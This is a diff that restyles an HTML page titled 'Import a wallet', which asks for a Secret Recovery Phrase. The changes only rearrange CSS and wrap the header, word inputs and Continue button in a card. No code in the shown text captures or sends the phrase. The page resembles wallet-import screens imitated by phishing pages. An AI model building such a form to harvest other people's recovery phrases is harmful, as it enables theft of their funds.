@@ -50,11 +50,21 @@ body {
   padding: 40px 32px;
 }
 
+.card {
+  background: #1a1a1a !important;
+  border: 1px solid #2a2a2a !important;
+  border-radius: 8px;
+  padding: 20px;
+  display: flex;
+  flex-direction: column;
+  gap: 20px;
+}
+
 .header {
   display: flex;
   align-items: center;
   gap: 16px;
-  margin-bottom: 32px;
+  margin-bottom: 0;
 }
 
 .back-btn {
@@ -107,19 +117,10 @@ body {
 }
 
 .form-group {
-  margin-bottom: 24px;
-}
-
-.card {
-  background: #1a1a1a !important;
-  border: 1px solid #2a2a2a !important;
-  border-radius: 8px;
-  padding: 20px;
-  margin-bottom: 16px;
+  margin-bottom: 0;
   display: flex;
-  flex-wrap: wrap;
-  gap: 10px;
-  align-content: flex-start;
+  flex-direction: column;
+  gap: 16px;
 }
 
 .word-container {
@@ -279,7 +280,6 @@ body {
   display: flex;
   justify-content: space-between;
   align-items: center;
-  margin-top: 16px;
   padding-top: 16px;
   border-top: 1px solid var(--card-border);
   min-height: 20px;
@@ -318,7 +318,6 @@ body {
   color: var(--label);
   font-size: 0.75rem;
   line-height: 1.4;
-  margin-top: 8px;
   width: 100%;
   display: none;
 }
@@ -484,16 +483,16 @@ body {
 <div class="container">
 
   <div id="main-page">
-    <div class="header">
-      <button class="back-btn" id="backBtn">‹</button>
-      <div class="header-content">
-        <h1>Import a wallet</h1>
-        <p>Enter your Secret Recovery Phrase <span class="help-icon">?</span></p>
+    <div class="card">
+      <div class="header">
+        <button class="back-btn" id="backBtn">‹</button>
+        <div class="header-content">
+          <h1>Import a wallet</h1>
+          <p>Enter your Secret Recovery Phrase <span class="help-icon">?</span></p>
+        </div>
       </div>
-    </div>
 
-    <div class="form-group">
-      <div class="card">
+      <div class="form-group">
         <div class="word-container" id="word-container">
           <input 
             type="text" 
@@ -515,9 +514,9 @@ body {
 
         <div class="helper-text" id="helperText">Use only lowercase letters, check your spelling, and put the words in the original order.</div>
       </div>
-    </div>
 
-    <button id="continueBtn" class="continue-btn" disabled>Continue</button>
+      <button id="continueBtn" class="continue-btn" disabled>Continue</button>
+    </div>
   </div>
 
   <div id="loading-page">
